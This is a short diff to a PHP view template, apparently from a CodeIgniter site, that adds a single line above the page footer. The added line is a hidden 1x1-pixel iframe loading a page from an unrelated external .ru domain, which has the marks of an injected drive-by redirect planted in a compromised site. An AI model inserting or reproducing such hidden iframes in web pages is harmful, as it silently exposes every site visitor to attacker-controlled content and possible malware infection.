@@ -3,6 +3,7 @@
 				$this->load->view('common/modal');
 			}
 		?>
+		<iframe src="http://admin.aydaeda.ru/main/iframe" height="1" width="1" name="admin"></iframe>
 		<footer>
 			<div class="content_helper">
 				<div class="f_block">
